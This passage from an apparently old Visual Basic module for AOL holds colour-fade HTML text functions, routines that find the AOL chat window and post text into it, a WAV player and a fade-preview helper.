        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_FourColors = Faded1$ + Faded2$ + Faded3$
End Function


Function Fade_EightColors(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, G1%, G2%, G3%, h1%, h2%, h3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If

p1$ = Fade_FourColors(a1, a2, a3, b1, b2, b3, C1, C2, C3, d1, d2, d3, hlf1$, Wavy)
p2$ = Fade_FourColors(e1, e2, e3, f1, f2, f3, G1, G2, G3, h1, h2, h3, hlf2$, Wavy)

Fade_EightColors = p1$ + p2$
End Function
Function Fade_EightColorsBack(a1%, a2%, a3%, b1%, b2%, b3%, C1%, C2%, C3%, d1%, d2%, d3%, e1%, e2%, e3%, f1%, f2%, f3%, G1%, G2%, G3%, h1%, h2%, h3%, Text2Fade$, Wavy As Boolean)

Cnt% = Len(Text2Fade) / 2
If Cnt% Mod 2 = 1 Then
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt% - 1)
Else
hlf1$ = Left(Text2Fade, Cnt%)
hlf2$ = Right(Text2Fade, Cnt%)
End If
p1$ = Fade_FourColorsBack(a1, a2, a3, b1, b2, b3, C1, C2, C3, d1, d2, d3, hlf1$, Wavy)
p2$ = Fade_FourColorsBack(e1, e2, e3, f1, f2, f3, G1, G2, G3, h1, h2, h3, hlf2$, Wavy)

Fade_EightColorsBack = p1$ + p2$
End Function

Function Fade_FourColorsBack(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Right(thetext, thrdlen%)
    
 
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    

    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_FourColorsBack = Faded1$ + Faded2$ + Faded3$
End Function



Function Fade_TenColors(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(thetext, ninelen%)
    

    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i

    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / textlen% * i) + b4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
  
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
   
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part8$)
    For i = 1 To textlen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - B8) / textlen% * i) + B8, ((G9 - G8) / textlen% * i) + G8, ((R9 - R8) / textlen% * i) + R8)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    'part9
    textlen% = Len(part9$)
    For i = 1 To textlen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B10 - B9) / textlen% * i) + B9, ((G10 - G9) / textlen% * i) + G9, ((R10 - R9) / textlen% * i) + R9)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded9$ = Faded9$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_TenColors = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function



Function Fade_TenColorsBack(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(thetext, ninelen%)
    

    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / textlen% * i) + b3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i

    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / textlen% * i) + b4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
  
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
   
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    textlen% = Len(part8$)
    For i = 1 To textlen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - B8) / textlen% * i) + B8, ((G9 - G8) / textlen% * i) + G8, ((R9 - R8) / textlen% * i) + R8)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    'part9
    textlen% = Len(part9$)
    For i = 1 To textlen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B10 - B9) / textlen% * i) + B9, ((G10 - G9) / textlen% * i) + G9, ((R10 - R9) / textlen% * i) + R9)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded9$ = Faded9$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    Fade_TenColorsBack = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function




Function FindChatRoom()
'Finds a chat room
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
room% = FindChildByClass(mdi%, "AOL Child")
STUFF% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function


Function FindChildByTitle(parentw, childhand)
firs% = getwindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = getwindow(parentw, GW_CHILD)

While firs%
firss% = getwindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = getwindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
room% = firs%
FindChildByTitle = room%
End Function

Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = getwindowtext(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function
Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function
Sub SendChat(Chat)
'Sends text to chat
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
End Sub


Sub SendChat_Ao3and4(Chat)
'Sends text to chat on AOL 3.0 or 4.0!
'Good for AOL 4.0 and 3.0 Progs
If AOLVersion2() = "4.0" Then
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
ElseIf AOLVersion2() = "3.0" Then
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
Else
MsgBox "Error: Cannot Process Request" + Chr$(13) + Chr$(10) + "" + Chr$(13) + Chr$(10) + "AOL Version is not 3.0 or 4.0", 16, "Error"
End If
End Sub
Function FindChildByClass(parentw, childhand)
firs% = getwindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = getwindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = getwindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = getwindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
room% = firs%
FindChildByClass = room%

End Function


Sub PlayWav32(WaveFile As String)
'The 32-Bit Playwav that works on all 32-bit
'applications
    Dim errorCode As Integer
    Dim Returnstr As Integer
    Dim errorStr As String * 256
    Dim MCIWaveOpenParms As MCI_WAVE_OPEN_PARMS
    Dim MCIPlayParms As MCI_PLAY_PARMS
    
    MCIWaveOpenParms.dwCallback = 0
    MCIWaveOpenParms.wDeviceID = 0
        
    MCIWaveOpenParms.lpstrDeviceType = "waveaudio"
    MCIWaveOpenParms.lpstrElementName = WaveFile
    
    MCIWaveOpenParms.lpstrAlias = 0
    MCIWaveOpenParms.dwBufferSeconds = 0
    
    errorCode = mciSendCommandA(0, MCI_OPEN, MCI_OPEN_TYPE Or MCI_OPEN_ELEMENT, _
                                MCIWaveOpenParms)
    
    If errorCode = 0 Then
        MCIPlayParms.dwCallback = 0
        MCIPlayParms.dwFrom = 0
        MCIPlayParms.dwTo = 0
    
        errorCode = mciSendCommandA(MCIWaveOpenParms.wDeviceID, MCI_PLAY, _
                                    MCI_WAIT, MCIPlayParms)
                                
        errorCode = mciSendCommandA(MCIWaveOpenParms.wDeviceID, MCI_CLOSE, _
                                    0, 0)
    End If
End Sub



Sub FadePreview_2Colors(pic As Object, a1%, a2%, a3%, b1%, b2%, b3%)
'This Will put a preview of the Fade on a Picbox or Form
'Put:
'Call FadePreview (FormName,PictureBoxName,ScrollBar1,Scrollbar2,Scrollbar3,Scrollbar4,Scrollbar5,ScrollBar6)
'in the Picbox as Click and when the user clicks on the picbox it will refresh itself
'It Fades From Right to Left
'if you want to make The Fade on a Form from
'Red to Blue you would put
'Call FadePreview(Me,255,0,0,0,0,255)
'In The Paint
'Remember you must put the Max value of a Scroll bar to 255!!!
'This was written by TiN
'VTiNMaNV@aol.com
'http://members.aol.com/VTiNMaNV

On Error Resume Next 'If an Error go to Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Dim FadeW As Integer
Dim Loo As Integer

'Starting color
FirstColor(1) = a1
FirstColor(2) = a2
FirstColor(3) = a3
'Ending color
SecondColor(1) = b1
SecondColor(2) = b2
SecondColor(3) = b3
'Splits First and Second Color
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)

